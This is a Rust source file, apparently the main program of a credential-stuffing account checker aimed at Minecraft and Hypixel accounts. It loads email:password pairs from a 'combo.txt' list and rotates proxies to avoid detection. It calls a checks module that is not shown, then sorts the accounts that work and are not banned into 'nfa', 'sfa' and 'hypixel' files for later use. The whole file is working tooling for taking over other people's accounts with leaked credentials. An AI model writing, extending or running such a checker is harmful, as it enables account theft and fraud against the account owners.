#![feature(fn_traits)]
#![feature(async_closure)]

use std::{
    fs::OpenOptions,
    io::{BufRead, BufReader, BufWriter, Write},
};

use crate::types::*;
pub mod checks;
pub mod types;

#[tokio::main]
async fn main() {
    println!("Hello, world!");

    let proxy_file = BufReader::new(
        OpenOptions::new()
            .write(true)
            .read(true)
            .create(true)
            .open("./proxies.txt")
            .unwrap(),
    );

    let proxies: Vec<String> = proxy_file.lines().collect::<Result<_, _>>().unwrap();

    let mut proxy = Proxy::new(proxies.get(0).unwrap().to_string(), 0, ProxyType::Http);
    let mut current_index = 0;
    let account_file = BufReader::new(
        OpenOptions::new()
            .write(true)
            .read(true)
            .create(true)
            .open("./combo.txt")
            .unwrap(),
    );

    let accounts: Vec<String> = account_file.lines().collect::<Result<_, _>>().unwrap();

    for ele in accounts {
        let mut account = Account::new(ele);

        match checks::run_checks(&mut account, &mut proxy).await {
            Ok(_) => {
                println!("Account {} is banned: {}", account.email, account.banned);
                if !account.banned {
                    write_account(account)
                }
            }
            Err(err) => {
                println!("{}", err.reason);
                current_index += 1;
                proxy = Proxy::new(
                    match proxies.get(current_index) {
                        Some(proxy) => proxy,
                        None => {
                            current_index = 0;
                            proxies.get(current_index).unwrap()
                        }
                    }
                    .to_string(),
                    0,
                    ProxyType::Http,
                )
            }
        };
    }
}

pub fn write_account(account: Account) {
    let mut file = BufWriter::new(
        OpenOptions::new()
            .write(true)
            .append(true)
            .create(true)
            .open("nfa.txt")
            .unwrap(),
    );
    let mut account_string = format!("{}:{}", account.email, account.password);

    if let Some(acc_type) = account.account_type {
        if let AccountType::MinecraftHypixel {
            last_login: _,
            rank,
            level,
        } = acc_type.clone()
        {
            file = BufWriter::new(
                OpenOptions::new()
                    .write(true)
                    .append(true)
                    .create(true)
                    .open("hypixel.txt")
                    .unwrap(),
            );
        }

        if let AccountType::MinecraftSfa = acc_type {
            file = BufWriter::new(
                OpenOptions::new()
                    .write(true)
                    .append(true)
                    .create(true)
                    .open("sfa.txt")
                    .unwrap(),
            );
        }
    }
    account_string.push('\n');
    file.write(account_string.as_bytes()).unwrap();
}
